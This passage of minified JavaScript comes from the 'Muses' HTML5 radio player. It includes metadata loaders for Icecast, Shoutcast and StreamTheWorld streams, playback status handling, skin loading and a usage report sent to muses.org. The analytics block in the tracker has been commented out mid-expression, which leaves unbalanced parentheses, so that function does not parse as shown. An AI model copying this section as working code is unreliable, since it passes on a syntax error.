              "__interfaces__" == c ||
              "__properties__" == c ||
              (2 != d.length && (d += ", \n"),
              (d += b + c + " : " + x.__string_rec(a[c], b)));
          b = b.substring(1);
          return d + ("\n" + b + "}");
        case "string":
          return a;
        default:
          return String(a);
      }
    };
    x.__interfLoop = function (a, b) {
      if (null == a) return !1;
      if (a == b) return !0;
      var c = a.__interfaces__;
      if (null != c)
        for (var d = 0, e = c.length; d < e; ) {
          var f = d++;
          f = c[f];
          if (f == b || x.__interfLoop(f, b)) return !0;
        }
      return x.__interfLoop(a.__super__, b);
    };
    x.__instanceof = function (a, b) {
      if (null == b) return !1;
      switch (b) {
        case Array:
          return a instanceof Array ? null == a.__enum__ : !1;
        case Ia:
          return "boolean" == typeof a;
        case La:
          return !0;
        case Ja:
          return "number" == typeof a;
        case Ma:
          return "number" == typeof a ? (a | 0) === a : !1;
        case String:
          return "string" == typeof a;
        default:
          if (null != a)
            if ("function" == typeof b) {
              if (a instanceof b || x.__interfLoop(x.getClass(a), b)) return !0;
            } else {
              if ("object" == typeof b && x.__isNativeObj(b) && a instanceof b)
                return !0;
            }
          else return !1;
          return (b == Na && null != a.__name__) ||
            (b == Oa && null != a.__ename__)
            ? !0
            : a.__enum__ == b;
      }
    };
    x.__nativeClassName = function (a) {
      a = x.__toStr.call(a).slice(8, -1);
      return "Object" == a || "Function" == a || "Math" == a || "JSON" == a
        ? null
        : a;
    };
    x.__isNativeObj = function (a) {
      return null != x.__nativeClassName(a);
    };
    x.__resolveNativeClass = function (a) {
      return q[a];
    };
    var Ea = function () {};
    Ea.__name__ = ["js", "Browser"];
    Ea.createXMLHttpRequest = function () {
      if ("undefined" != typeof XMLHttpRequest) return new XMLHttpRequest();
      if ("undefined" != typeof ActiveXObject)
        return new ActiveXObject("Microsoft.XMLHTTP");
      throw new p("Unable to create XMLHttpRequest object.");
    };
    var P = function () {};
    P.__name__ = ["js", "Cookie"];
    P.set = function (a, b, c, d, e) {
      a = a + "=" + encodeURIComponent(b);
      null != c &&
        ((c = new Date().getTime() + 1e3 * c),
        (a += ";expires=" + new Date(c).toGMTString()));
      null != d && (a += ";path=" + d);
      null != e && (a += ";domain=" + e);
      window.document.cookie = a;
    };
    P.all = function () {
      for (
        var a = new v(), b = window.document.cookie.split(";"), c = 0;
        c < b.length;

      ) {
        var d = b[c];
        ++c;
        d = y.ltrim(d);
        var e = d.split("=");
        2 > e.length ||
          ((d = e[0]),
          (e = decodeURIComponent(e[1].split("+").join(" "))),
          null != t[d] ? a.setReserved(d, e) : (a.h[d] = e));
      }
      return a;
    };
    P.exists = function (a) {
      var b = P.all();
      return null != t[a] ? b.existsReserved(a) : b.h.hasOwnProperty(a);
    };
    var H = function (a) {
      if (a instanceof Array && null == a.__enum__)
        (this.a = a), (this.byteLength = a.length);
      else {
        this.a = [];
        for (var b = 0; b < a; ) {
          var c = b++;
          this.a[c] = 0;
        }
        this.byteLength = a;
      }
    };
    H.__name__ = ["js", "html", "compat", "ArrayBuffer"];
    H.sliceImpl = function (a, b) {
      a = new Ba(this, a, null == b ? null : b - a);
      b = new Fa(a.byteLength);
      new Ba(b).set(a);
      return b;
    };
    H.prototype = {
      slice: function (a, b) {
        return new H(this.a.slice(a, b));
      },
      __class__: H,
    };
    var M = function () {};
    M.__name__ = ["js", "html", "compat", "Uint8Array"];
    M._new = function (a, b, c) {
      if ("number" == typeof a) {
        c = [];
        for (b = 0; b < a; ) {
          var d = b++;
          c[d] = 0;
        }
        c.byteLength = c.length;
        c.byteOffset = 0;
        c.buffer = new H(c);
      } else if (x.__instanceof(a, H))
        null == b && (b = 0),
          null == c && (c = a.byteLength - b),
          (c = 0 == b ? a.a : a.a.slice(b, b + c)),
          (c.byteLength = c.length),
          (c.byteOffset = b),
          (c.buffer = a);
      else if (a instanceof Array && null == a.__enum__)
        (c = a.slice()),
          (c.byteLength = c.length),
          (c.byteOffset = 0),
          (c.buffer = new H(c));
      else throw new p("TODO " + I.string(a));
      c.subarray = M._subarray;
      c.set = M._set;
      return c;
    };
    M._set = function (a, b) {
      if (x.__instanceof(a.buffer, H)) {
        if (a.byteLength + b > this.byteLength)
          throw new p("set() outside of range");
        for (var c = 0, d = a.byteLength; c < d; ) {
          var e = c++;
          this[e + b] = a[e];
        }
      } else if (a instanceof Array && null == a.__enum__) {
        if (a.length + b > this.byteLength)
          throw new p("set() outside of range");
        c = 0;
        for (d = a.length; c < d; ) (e = c++), (this[e + b] = a[e]);
      } else throw new p("TODO");
    };
    M._subarray = function (a, b) {
      b = M._new(this.slice(a, b));
      b.byteOffset = a;
      return b;
    };
    var aa = function () {
      this.title =
        this.artist =
        this.album =
        this.genre =
        this.comment =
        this.encoder =
        this.year =
          "";
    };
    aa.__name__ = ["muses", "AudioMetadata"];
    aa.prototype = {
      set: function (a, b) {
        switch (a.toLowerCase()) {
          case "album":
            this.album = b;
            break;
          case "artist":
            this.artist = b;
            break;
          case "encoder":
            this.encoder = b;
            break;
          case "genre":
            this.genre = b;
            break;
          case "title":
            this.title = b;
            break;
          case "year":
            this.year = b;
        }
      },
      getJson: function () {
        return (
          '{"title":"' +
          y.replace(this.title, '"', "'") +
          '","artist":"' +
          y.replace(this.artist, '"', "'") +
          '","album":"' +
          y.replace(this.album, '"', "'") +
          '","genre":"' +
          y.replace(this.genre, '"', "'") +
          '","comment":"' +
          y.replace(this.comment, '"', "'") +
          '","encoder":"' +
          y.replace(this.encoder, '"', "'") +
          '","year":"' +
          y.replace(this.year, '"', "'") +
          '"}'
        );
      },
      __class__: aa,
    };
    var l = function () {};
    l.__name__ = ["muses", "ContextMenu"];
    l.createContainerDiv = function () {
      if (
        null == l.container &&
        ((l.container = window.document.getElementById(
          "musesContextMenuContainer"
        )),
        (l.titleDiv = window.document.getElementById(
          "musesContextMenuTitleDiv"
        )),
        (l.aboutDiv = window.document.getElementById(
          "musesContextMenuAboutDiv"
        )),
        (l.versionDiv = window.document.getElementById(
          "musesContextMenuVersionDiv"
        )),
        null == l.container)
      ) {
        var a = window.document.createElement("style"),
          b = window.document.createTextNode(
            "DIV#musesContextMenuContainer{margin:0;padding:0;z-index:2147483647;text-align:left;width:auto;height:auto;background-color:#fff;border: solid #dedede 1px;position:absolute;cursor:default;display:none;font-family:Arial;color:#000;font-size:12px;border-radius:3px;}DIV#musesContextMenuTitleDiv{margin:0;padding:5px;font-weight:bold;color:#b5b5b5;border-bottom:solid #dedede 1px}DIV#musesContextMenuAboutDiv{margin:0;padding:5px;font-weight:bold;}DIV#musesContextMenuAboutDiv:hover{text-decorations:underline;cursor:pointer;background-color:#eee;}DIV#musesContextMenuAboutDiv A {text-decoration:none;color:#555}DIV#musesContextMenuVersionDiv{margin:0;padding:0px 5px 5px 5px;font-size:11px;}"
          );
        a.appendChild(b);
        l.container = window.document.createElement("div");
        l.titleDiv = window.document.createElement("div");
        l.aboutDiv = window.document.createElement("div");
        l.versionDiv = window.document.createElement("div");
        l.container.classList.add("musesStyleReset");
        l.container.id = "musesContextMenuContainer";
        l.titleDiv.id = "musesContextMenuTitleDiv";
        l.aboutDiv.id = "musesContextMenuAboutDiv";
        l.versionDiv.id = "musesContextMenuVersionDiv";
        l.container.appendChild(l.titleDiv);
        l.container.appendChild(l.aboutDiv);
        l.container.appendChild(l.versionDiv);
        window.document.head.appendChild(a);
        window.document.body.appendChild(l.container);
      }
    };
    l.prepare = function (a) {
      l.createContainerDiv();
      l.versionDiv.style.textAlign = a.getTextAlign();
      l.aboutDiv.style.textAlign = a.getTextAlign();
      var b = a.getText("version") + " ";
      l.versionDiv.innerHTML = b + "2.4.5 (html5)";
      a =
        "<a href='https://www.muses.org/' target='_blank'>" +
        a.getText("about");
      l.aboutDiv.innerHTML = a + "</a>";
    };
    l.hide = function (a) {
      l.displaying &&
        ((l.container.style.display = "none"),
        window.document.removeEventListener("click", l.hide),
        (l.displaying = !1));
    };
    l.display = function (a, b, c, d) {
      l.prepare(d);
      l.displaying ||
        ((l.container.style.display = "block"),
        window.document.addEventListener("click", l.hide),
        (l.displaying = !0));
      l.container.style.left = a - 3 + "px";
      l.container.style.top = b - 3 + "px";
      l.titleDiv.style.textAlign = d.getTextAlign();
      l.titleDiv.innerHTML = c;
    };
    var Ca = function (a, b) {
      this.timer = null;
      this.player = a;
      null != b.metadataMode && (this.metadataMode = b.metadataMode);
      this.interval = null != b.metadataInterval ? b.metadataInterval : 20;
      null != b.metadataProxy && (this.proxy = b.metadataProxy);
      "" == this.proxy && (this.proxy = null);
    };
    Ca.__name__ = ["muses", "MetadataLoader"];
    Ca.prototype = {
      stop: function () {
        null != this.timer && (this.timer.stop(), (this.timer = null));
      },
      begin: function () {
        ("icecast" != this.metadataMode &&
          "streamtheworld" != this.metadataMode &&
          "shoutcast" != this.metadataMode) ||
          null != this.timer ||
          ((this.timer = new G(1e3 * this.interval)),
          (this.timer.run = u(this, this.loop)),
          this.loop());
      },
      loop: function () {
        if (this.player.shouldBePlaying()) {
          switch (this.metadataMode) {
            case "icecast":
              var a = this.player.getCurrentUrl().split("?")[0] + ".xspf";
              break;
            case "shoutcast":
              a =
                r.substr(
                  this.player.getCurrentUrl(),
                  0,
                  this.player.getCurrentUrl().indexOf("/", 9)
                ) + "/7.html";
              break;
            case "streamtheworld":
              a = this.mUrl + "&" + new Date().getTime();
              break;
            default:
              a = null;
          }
          null != this.proxy &&
            (a = this.proxy + "?url=" + y.replace(a, ":", "%3A"));
          this.loadMetadata(a);
        } else this.stop();
      },
      loadMetadata: function (a) {
        a = new T(a);
        a.onError = u(this, this.onError);
        switch (this.metadataMode) {
          case "icecast":
            var b = u(this, this.loadIcecastEvent);
            break;
          case "shoutcast":
            b = u(this, this.loadShoutcastEvent);
            break;
          case "streamtheworld":
            b = u(this, this.loadStreamTheWorldEvent);
            break;
          default:
            b = null;
        }
        a.onData = b;
        a.async = !0;
        a.request(!1);
      },
      onError: function (a) {
        console.log("Metadata Error: " + a);
      },
      loadStreamTheWorldEvent: function (a) {
        a = h.parse(a);
        if (a.nodeType != h.Document && a.nodeType != h.Element)
          throw new p(
            "Bad node type, expected Element or Document but found " +
              a.nodeType
          );
        a = a.children[0];
        if (a.nodeType != h.Element)
          throw new p(
            "Bad node type, expected Element but found " + a.nodeType
          );
        if ("nowplaying-info-list" == a.nodeName.toLowerCase())
          for (a = a.elementsNamed("nowplaying-info"); a.hasNext(); ) {
            var b = a.next();
            a = new aa();
            for (b = b.elementsNamed("property"); b.hasNext(); ) {
              var c = b.next();
              if ("cue_title" == c.get("name")) {
                if (c.nodeType != h.Document && c.nodeType != h.Element)
                  throw new p(
                    "Bad node type, expected Element or Document but found " +
                      c.nodeType
                  );
                var d = c.children[0];
                if (d.nodeType == h.Document || d.nodeType == h.Element)
                  throw new p("Bad node type, unexpected " + d.nodeType);
                a.title = d.nodeValue;
              }
              if ("track_artist_name" == c.get("name")) {
                if (c.nodeType != h.Document && c.nodeType != h.Element)
                  throw new p(
                    "Bad node type, expected Element or Document but found " +
                      c.nodeType
                  );
                d = c.children[0];
                if (d.nodeType == h.Document || d.nodeType == h.Element)
                  throw new p("Bad node type, unexpected " + d.nodeType);
                a.artist = d.nodeValue;
              }
              if ("cue_time_start" == c.get("name")) {
                if (c.nodeType != h.Document && c.nodeType != h.Element)
                  throw new p(
                    "Bad node type, expected Element or Document but found " +
                      c.nodeType
                  );
                c = c.children[0];
                if (c.nodeType == h.Document || c.nodeType == h.Element)
                  throw new p("Bad node type, unexpected " + c.nodeType);
                a.comment = c.nodeValue;
              }
            }
            this.player.ui.setMetadata(a);
            break;
          }
      },
      loadShoutcastEvent: function (a) {
        if (null != a && "" != a) {
          a = y.replace(a, "<html>", "");
          a = y.replace(a, "</html>", "");
          a = y.replace(a, "<body>", "");
          a = y.replace(a, "</body>", "");
          a = a.split(",");
          for (var b = a[6], c = 7, d = a.length; c < d; ) {
            var e = c++;
            b += "," + a[e];
          }
          null != b &&
            "" != b &&
            this.player.ui.setMetadataFromString(y.trim(b));
        }
      },
      loadIcecastEvent: function (a) {
        if (null != a && "" != a) {
          var b = h.parse(a).firstElement(),
            c = (a = null);
          if (b.nodeType != h.Element)
            throw new p(
              "Bad node type, expected Element but found " + b.nodeType
            );
          if ("playlist" == b.nodeName.toLowerCase()) {
            for (b = b.elements(); b.hasNext(); ) {
              var d = b.next();
              if (d.nodeType != h.Element)
                throw new p(
                  "Bad node type, expected Element but found " + d.nodeType
                );
              if ("tracklist" == d.nodeName.toLowerCase())
                for (d = d.elements(); d.hasNext(); ) {
                  var e = d.next();
                  if (e.nodeType != h.Element)
                    throw new p(
                      "Bad node type, expected Element but found " + e.nodeType
                    );
                  if ("track" == e.nodeName.toLowerCase())
                    for (e = e.elements(); e.hasNext(); ) {
                      var f = e.next();
                      if (f.nodeType != h.Element)
                        throw new p(
                          "Bad node type, expected Element but found " +
                            f.nodeType
                        );
                      if ("title" == f.nodeName.toLowerCase()) {
                        if (f.nodeType != h.Document && f.nodeType != h.Element)
                          throw new p(
                            "Bad node type, expected Element or Document but found " +
                              f.nodeType
                          );
                        a = f.children[0];
                        if (a.nodeType == h.Document || a.nodeType == h.Element)
                          throw new p(
                            "Bad node type, unexpected " + a.nodeType
                          );
                        a = a.nodeValue;
                      } else {
                        if (null == c) {
                          if (f.nodeType != h.Element)
                            throw new p(
                              "Bad node type, expected Element but found " +
                                f.nodeType
                            );
                          var k = "creator" == f.nodeName.toLowerCase();
                        } else k = !1;
                        if (k) {
                          if (
                            f.nodeType != h.Document &&
                            f.nodeType != h.Element
                          )
                            throw new p(
                              "Bad node type, expected Element or Document but found " +
                                f.nodeType
                            );
                          c = f.children[0];
                          if (
                            c.nodeType == h.Document ||
                            c.nodeType == h.Element
                          )
                            throw new p(
                              "Bad node type, unexpected " + c.nodeType
                            );
                          c = c.nodeValue;
                        } else {
                          if (f.nodeType != h.Element)
                            throw new p(
                              "Bad node type, expected Element but found " +
                                f.nodeType
                            );
                          if ("artist" == f.nodeName.toLowerCase()) {
                            if (
                              f.nodeType != h.Document &&
                              f.nodeType != h.Element
                            )
                              throw new p(
                                "Bad node type, expected Element or Document but found " +
                                  f.nodeType
                              );
                            c = f.children[0];
                            if (
                              c.nodeType == h.Document ||
                              c.nodeType == h.Element
                            )
                              throw new p(
                                "Bad node type, unexpected " + c.nodeType
                              );
                            c = c.nodeValue;
                          }
                        }
                      }
                    }
                }
            }
            if (null != a || null != c)
              null == c
                ? this.player.ui.setMetadataFromString(a)
                : ((b = new aa()),
                  (b.title = a),
                  (b.artist = c),
                  this.player.ui.setMetadata(b));
          }
        }
      },
      __class__: Ca,
    };
    var F = (d.muses.Muses = function (a) {
      this.legacyData = new v();
      this.metadataLoader = null;
      this.activated = !1;
      this.lastMessage = null;
      this.lastVolume = 1;
      this.src = this.name = null;
      this.progress = 0;
      this.lastAudioName = null;
      this.playURL = "";
      this.mustWaitForBuffer = !1;
      this.playTimeout = this.bufferingTimeout = this.requestedBuffering = 0;
      this.desiredStatus = "stop";
      this.audio = this.lastAudioStatus = this.lastAudioSrc = null;
      this.playerParams = a;
      this.src = a.url;
      this.name = a.title;
      this.audio = new Audio();
      this.ui = new B(this, a);
      null != a.buffering && (this.requestedBuffering = a.buffering);
      this.mustWaitForBuffer = 0 < this.requestedBuffering;
      this.metadataLoader = new Ca(this, a);
      a.autoplay &&
        (this.audio.addEventListener("play", u(this, this.activate)),
        this.playAudio(!1));
    });
    F.__name__ = ["muses", "Muses"];
    F.initTimer = function (a) {
      -1 == F.instances.indexOf(a) && F.instances.push(a);
      null == F.statusTimer &&
        ((F.statusTimer = new G(500)),
        (F.statusTimer.run = function () {
          for (var a = 0, c = F.instances; a < c.length; ) {
            var d = c[a];
            ++a;
            try {
              d.checkAudioStatus();
            } catch (S) {
              if ((S instanceof p && (S = S.val), x.__instanceof(S, String)))
                console.log("Error: " + S);
              else throw S;
            }
          }
        }));
    };
    F.prototype = {
      activate: function () {
        this.activated ||
          ((this.activated = !0),
          F.initTimer(this),
          this.metadataLoader.begin(),
          (this.mustWaitForBuffer = 0 < this.requestedBuffering));
      },
      setUrl: function (a) {
        this.src = a;
      },
      setFallbackUrl: function (a) {
        console.log(
          "Alert! setFallbackUrl not yet implemented on HTML5 version..."
        );
      },
      isPlaying: function () {
        return !this.mustWaitForBuffer &&
          null != this.audio &&
          0 < this.audio.currentTime &&
          !this.audio.paused &&
          !this.audio.ended
          ? 2 < this.audio.readyState
          : !1;
      },
      shouldBePlaying: function () {
        return "play" == this.desiredStatus;
      },
      getCurrentUrl: function () {
        return this.src;
      },
      playAudio: function (a) {
        null == a && (a = !0);
        a && this.activate();
        this.stopAudio(!1);
        this.playURL = this.src;
        this.desiredStatus = "play";
        this.playTimeout = 7200;
        this.bufferingTimeout = this.requestedBuffering + 40;
        a = "?";
        1 < this.src.split("?").length && (a = "&");
        a = this.src + a;
        var b = new Date().getTime();
        this.audio.src = a + b;
        this.lastAudioSrc = this.src;
        this.lastAudioName = this.name;
        this.lastAudioStatus = null;
        this.audio.autoplay = !0;
        this.setVolume(this.lastVolume, !0);
        this.audio.play();
        this.activated &&
          (this.ui.setPlaying(),
          this.metadataLoader.begin(),
          (this.mustWaitForBuffer = 0 < this.requestedBuffering));
        this.mustWaitForBuffer &&
          ((this.audio.volume = 0),
          0 < this.audio.volume && (this.mustWaitForBuffer = !1));
      },
      stopAudio: function (a) {
        this.desiredStatus = "stop";
        null != this.audio && (this.audio.pause(), (this.audio.src = ""));
        a && ((this.lastAudioStatus = 4), this.metadataLoader.stop());
      },
      retryAudio: function (a) {
        null == a && (a = 5e3);
        var b = this;
        -1 != this.lastAudioStatus &&
          ((this.lastAudioStatus = -1),
          G.delay(function () {
            -1 == b.lastAudioStatus && b.playAudio();
          }, a));
      },
      setVolume: function (a, b) {
        null == b && (b = !1);
        this.lastVolume = a;
        this.mustWaitForBuffer ||
          ((this.audio.volume = a), (this.lastVolume = this.audio.volume));
        null != this.ui && this.ui.setVolume(this.lastVolume, b);
      },
      checkAudioStatus: function () {
        var a = null;
        if (null != this.audio) {
          a = this.audio.networkState;
          I.string(this.audio.error);
          if (2 == a || 1 == a) a = 2;
          if (null != this.audio.error || 4 == this.lastAudioStatus) a = 3;
          this.mustWaitForBuffer &&
            0 < this.audio.currentTime &&
            (2 == a && (a = 1),
            this.audio.currentTime >= this.requestedBuffering &&
              ((this.audio.volume = this.lastVolume),
              (this.mustWaitForBuffer = !1),
              (this.audio.currentTime = 0)));
        }
        0 == a
          ? ((a = "Error al conectar"),
            this.lastMessage != a && this.ui.setError())
          : -1 == a
          ? (a = "retry...")
          : null == a
          ? (a = "init")
          : 1 == a
          ? (this.bufferingTimeout--,
            0 == this.bufferingTimeout && this.retryAudio(),
            (a = "Buffering... " + Math.round(this.bufferingTimeout / 2)),
            this.lastMessage != a && this.ui.setBuffering())
          : 2 == a
          ? (this.playTimeout--,
            0 == this.playTimeout && this.retryAudio(5),
            (a = "Playing... "),
            this.lastMessage != a &&
              (this.ui.setPlaying(), this.reportLegacyPlayer()))
          : 4 == a || 3 == a
          ? "play" == this.desiredStatus
            ? ((a = "Error de red"),
              this.retryAudio(),
              this.lastMessage != a && this.ui.setError())
            : ((a = "Stopped."), this.lastMessage != a && this.ui.setStopped())
          : ((a = "ERROR: " + a), console.log(a));
        this.lastMessage = a;
      },
      reportLegacyPlayer: function () {
        if (null != this.src) {
          var a = window.navigator.language;
          a = null != a ? a.split("-")[0] : "N/A";
          null == this.playerParams.lang && (this.playerParams.lang = "auto");
          null == this.playerParams.codec && (this.playerParams.codec = "auto");
          null == this.playerParams.title && (this.playerParams.title = "-");
          null == this.playerParams.welcome &&
            (this.playerParams.welcome = "-");
          null == this.playerParams.skin && (this.playerParams.skin = "-");
          var b = window.location.href;
          null == b && (b = "-");
          a = JSON.stringify({
            title: this.playerParams.title,
            url: this.src,
            codec: this.playerParams.codec,
            welcome: this.playerParams.welcome,
            skin: this.playerParams.skin,
            playerLang: this.playerParams.lang,
            listenerLang: a,
            website: b,
          });
          b = O.encode(a);
          var c = this.legacyData;
          (null != t[b] ? c.existsReserved(b) : c.h.hasOwnProperty(b)) ||
            ((c = this.legacyData),
            null != t[b] ? c.setReserved(b, !0) : (c.h[b] = !0),
            P.exists(b)
              ? console.log("COOKIE EXISTS!")
              : (P.set(b, "1", 43200),
                (b = new T("https://www.muses.org/ws/legacyPlayer")),
                (b.onData = function (a) {
                  console.log(a);
                }),
                (b.async = !0),
                b.setParameter("json", a),
                b.request(!0)));
        }
      },
      __class__: F,
    };
    var z = function () {};
    z.__name__ = ["muses", "Tracker"];
    z.track = function (a, b, c) {
      if (z.enabled && !("error" == a && 3 < ++z.trackedErrors)) {
        null == z.userLang &&
          ((z.userLang = window.navigator.language),
          (z.userLang = null != z.userLang ? z.userLang.split("-")[0] : "N/A"));
        var d = {
          dimension1: c.ui.skin,
          dimension2: c.getCurrentUrl() + " (" + c.name + ")",
          dimension3: "2.4.5 (html5)",
          dimension4: window.location.href,
          dimension5: c.playerParams.codec,
          dimension6: c.playerParams.lang,
          dimension7: z.userLang,
        };
        "stop" == b && (d.metric1 = c.ui.getPlayTime());
        z.initialize(c, d);
        // ga('musesTracker.send', 'event', a, b, d);
      }
    };
    z.initialize = function (a, b) {
      z.initialized ||
        ((z.initialized = !0),
        /*
        (function (a, b, d, e, h, k, l) {
          a.GoogleAnalyticsObject = h;
          a[h] =
            a[h] ||
            function () {
              (a[h].q = a[h].q || []).push(arguments);
            };
          a[h].l = 1 * new Date();
          k = b.createElement(d);
          l = b.getElementsByTagName(d)[0];
          k.async = 1;
          k.src = e;
          l.parentNode.insertBefore(k, l);
        })(
          window,
          document,
          "script",
          "https://www.google-analytics.com/analytics.js",
          "ga"
        ),
        ga("create", "UA-12297597-7", "auto", "musesTracker"),
        */
        (new G(3e5).run = function () {
          a.shouldBePlaying() &&
            ((b.metric1 = a.ui.getPlayTime()),
            // ga('musesTracker.send', 'event', 'play', 'playing', b));
        }));
    };
    var B = (d.muses.UI = function (a, b) {
      this.toggleBuffer = !1;
      this.playStartedTimestamp = 0;
      this.lastMetadata = this.lastMetadataJson = null;
      this.skinFolder = this.baseURL = this.skinDomain = "";
      this.togglePlayStopEnabled = this.lastToggleValue = !1;
      this.status =
        this.mainDiv =
        this.playButton =
        this.stopButton =
        this.volumeControl =
        this.bg =
        this.statusText =
        this.artistText =
        this.songTitleText =
        this.statusLed =
          null;
      this.skin = "";
      var c = this;
      this.title = b.title;
      this.skin = b.skin;
      this.reportEvents = null == b.jsevents ? !1 : b.jsevents;
      this.muses = a;
      this.language = Ga.factory(b.lang);
      l.prepare(this.language);
      this.mainDiv = window.document.getElementById(b.elementId);
      this.mainDiv.style.position = "relative";
      this.mainDiv.addEventListener(
        "contextmenu",
        u(this, this.showContextMenu)
      );
      this.statusText = new Q(this);
      this.artistText = new Q(this);
      this.songTitleText = new Q(this);
      this.statusLed = new ba(this);
      this.volumeControl = new ca(this, this.muses);
      this.volumeControl.setVolume(b.volume / 100, !0);
      this.playButton = new V(this, "play");
      this.stopButton = new V(this, "stop");
      this.loadSkin(this.skin, function () {
        c.statusLed.configured && c.mainDiv.appendChild(c.statusLed.container);
        c.statusText.configured &&
          c.mainDiv.appendChild(c.statusText.container);
        c.artistText.configured &&
          c.mainDiv.appendChild(c.artistText.container);
        c.songTitleText.configured &&
          c.mainDiv.appendChild(c.songTitleText.container);
        c.volumeControl.configured &&
          c.mainDiv.appendChild(c.volumeControl.container);
        c.mainDiv.appendChild(c.playButton.container);
        c.mainDiv.appendChild(c.stopButton.container);
        c.stopButton.container.onclick = function (a) {
          c.muses.stopAudio(!0);
        };
        c.playButton.container.onclick = function (a) {
          c.muses.playAudio();
        };
        c.showInfo(b.welcome);
      });
    });
    B.__name__ = ["muses", "UI"];
    B.parseInt = function (a, b) {
      return null == a ? b : I.parseInt(a);
    };
    B.prototype = {
      XmlToLower: function (a) {
        for (var b = a.attributes(); b.hasNext(); ) {
          var c = b.next();
          a.set(c.toLowerCase(), a.get(c));
        }
      },
      enablePlayStopToggle: function () {
        this.togglePlayStopEnabled = !0;
        this.togglePlayStop(this.lastToggleValue);
      },
      togglePlayStop: function (a) {
        this.lastToggleValue = a;
        this.togglePlayStopEnabled &&
          (this.playButton.setVisible(!a), this.stopButton.setVisible(a));
      },
      makeAbsolute: function (a) {
        return -1 != a.indexOf("://")
          ? a
          : "/" == a.charAt(0)
          ? this.skinDomain + a
          : this.baseURL + a;
      },
      getDomainName: function (a) {
        a += "/";
        var b = a.indexOf("://");
        return -1 == b ? "" : r.substr(a, 0, a.indexOf("/", b + 3));
      },
      getDirName: function (a) {
        var b = a.lastIndexOf("/");
        return -1 == b ? "" : r.substr(a, 0, b + 1);
      },
      loadSkin: function (a, b) {
        var c = this,
          d = new T(a);
        d.onData = function (d) {
          c.baseURL = c.getDirName(a);
          c.skinDomain = c.getDomainName(a);
          for (d = h.parse(d).elements(); d.hasNext(); ) {
            var e = d.next();
            if (e.nodeType != h.Element)
              throw new p(
                "Bad node type, expected Element but found " + e.nodeType
              );
            if ("ffmp3-skin" != e.nodeName.toLowerCase()) {
              if (e.nodeType != h.Element)
                throw new p(
                  "Bad node type, expected Element but found " + e.nodeType
                );
              var g = "muses-skin" != e.nodeName.toLowerCase();
            } else g = !1;
            if (g) return;
            c.XmlToLower(e);
            g = null == e.get("folder") ? "" : e.get("folder");
            c.skinFolder = g;
            (g =
              null == e.get("toggleplaystop")
                ? !1
                : "true" == e.get("toggleplaystop")) &&
              c.enablePlayStopToggle();
            0 < c.skinFolder.length &&
              "/" != c.skinFolder.charAt(c.skinFolder.length - 1) &&
              (c.skinFolder += "/");
            c.skinFolder = c.makeAbsolute(c.skinFolder);
            for (e = e.elements(); e.hasNext(); ) {
              g = e.next();
              c.XmlToLower(g);
              if (g.nodeType != h.Element)
                throw new p(
                  "Bad node type, expected Element but found " + g.nodeType
                );
              switch (g.nodeName.toLowerCase()) {
                case "artist":
                  c.artistText.configureText(g, c.language.getTextAlign());
                  break;
                case "bg":
                  c.configureBG(g);
                  break;
                case "play":
                  c.playButton.configure(g);
                  break;
                case "songtitle":
                  c.songTitleText.configureText(g, c.language.getTextAlign());
                  break;
                case "status":
                  c.statusLed.configure(g);
                  break;
                case "stop":
                  c.stopButton.configure(g);
                  break;
                case "text":
                  c.statusText.configureText(g, c.language.getTextAlign());
                  break;
                case "volume":
                  c.volumeControl.configure(g);
              }
            }
          }
          b();
        };
        d.async = !0;
        d.request(!1);
      },
      loadImage: function (a, b) {
        a.src = this.skinFolder + b;
        a.style.width = "auto";
        a.style.height = "auto";
      },
      configureBG: function (a) {
        this.bg = new Image();
        this.loadImage(this.bg, a.get("image"));
        this.bg.style.position = "absolute";
        var b = B.parseInt(a.get("x"), 0);
        this.bg.style.left = b + "px";
        a = B.parseInt(a.get("y"), 0);
        this.bg.style.top = a + "px";
        this.mainDiv.appendChild(this.bg);
      },
      configureButton: function (a, b) {
        a.src = this.skinFolder + b.get("image");
        a.style.position = "absolute";
        var c = B.parseInt(b.get("x"), 0);
        a.style.left = c + "px";
        b = B.parseInt(b.get("y"), 0);
        a.style.top = b + "px";
      },
      callback: function (a, b) {
        null == b && (b = "0");
        this.reportEvents && musesCallback(a, b);
      },
      setStatus: function (a) {
        this.showInfo(this.language.getText(a));
        this.callback(a);
        this.status = a;
      },
      getPlayTime: function () {
        console.log(this.playStartedTimestamp);
        return 0 == this.playStartedTimestamp
          ? 0
          : Math.round(new Date().getTime()) - this.playStartedTimestamp;
      },
      setPlaying: function () {
        this.setStatus("play");
        this.statusLed.on();
        this.togglePlayStop(!0);
        this.playStartedTimestamp = Math.round(new Date().getTime());
        z.track("play", "play", this.muses);
      },
      setStopped: function () {
        this.setStatus("stop");
        this.statusLed.off();
        this.togglePlayStop(!1);
        this.artistText.setText("");
        this.songTitleText.setText("");
        this.lastMetadata = this.lastMetadataJson = null;
        this.playStartedTimestamp = 0;
        z.track("play", "stop", this.muses);
      },
      setBuffering: function () {
        this.status = "buffering";
        this.callback(this.status);
        this.toggleBuffer ? this.showInfo("\u25cf") : this.showInfo("\u25cb");
        this.toggleBuffer = !this.toggleBuffer;
        this.statusLed.on();
        this.togglePlayStop(!0);
      },
      setError: function () {
        this.setStatus("ioError");
        this.statusLed.off();
        z.track("error", "ioError", this.muses);
      },
      setVolume: function (a, b) {
        this.volumeControl.setVolume(a, b);
        b ||
          this.showInfo(
            this.language.getText("volume") + ": " + Math.round(100 * a) + "%"
          );
        this.callback("volume", "" + Math.round(100 * a));
      },
      setMetadataFromString: function (a) {
        if (this.muses.shouldBePlaying() && this.lastMetadata != a) {
          var b = a.indexOf(" - ", 0);
          -1 != b
            ? (this.artistText.setText(r.substr(a, 0, b)),
              this.songTitleText.setText(r.substr(a, b + 3, null)))
            : (this.artistText.setText(""), this.songTitleText.setText(a));
          this.lastMetadata = a;
          this.callback("metadata", a);
        }
      },
      setMetadata: function (a) {
        if (this.muses.shouldBePlaying()) {
          var b = a.artist + " - " + a.title;
          this.lastMetadata != b &&
            ((this.lastMetadata = b), this.callback("metadata", b));
          b = a.getJson();
          this.lastMetadataJson != b &&
            ((this.lastMetadataJson = b),
            this.artistText.setText(a.artist),
            this.songTitleText.setText(a.title),
            this.callback("metadata-json", "[" + b + "]"));
        }
      },
      showInfo: function (a, b) {
        null == b && (b = !0);
        null == a
          ? this.restoreTitle()
          : (null != this.titleTimer && this.titleTimer.stop(),
            this.statusText.setText(a),
            b &&
              ((this.titleTimer = new G(2e3)),
              (this.titleTimer.run = u(this, this.restoreTitle))));
      },
      restoreTitle: function () {
        null != this.titleTimer && this.titleTimer.stop();
        this.statusText.setText(this.title);
      },
      setTitle: function (a) {
        this.title = a;
